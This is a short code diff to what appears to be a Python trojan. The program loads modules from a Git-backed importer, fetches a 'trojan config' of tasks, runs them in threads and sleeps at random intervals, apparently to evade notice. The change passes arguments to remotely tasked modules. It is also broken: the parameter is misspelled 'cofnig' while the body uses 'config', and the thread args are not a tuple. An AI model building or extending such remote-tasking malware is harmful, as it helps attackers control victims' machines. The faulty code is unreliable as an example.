@@ -84,9 +84,9 @@ class GitImporter(object):
         return module
 
 
-def module_runner(module):
+def module_runner(cofnig):
     task_queue.put(1)
-    result = sys.modules[module].run()
+    result = sys.modules[config['module']].run(config['args'])
     task_queue.get()
 
     store_module_result(result)
@@ -100,7 +100,7 @@ while True:
     if task_queue.empty():
         config = get_trojan_config()
         for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t = threading.Thread(target=module_runner, args=(task))
             t.start()
             time.sleep(random.randint(1, 10))
     time.sleep(random.randint(1000, 10000))
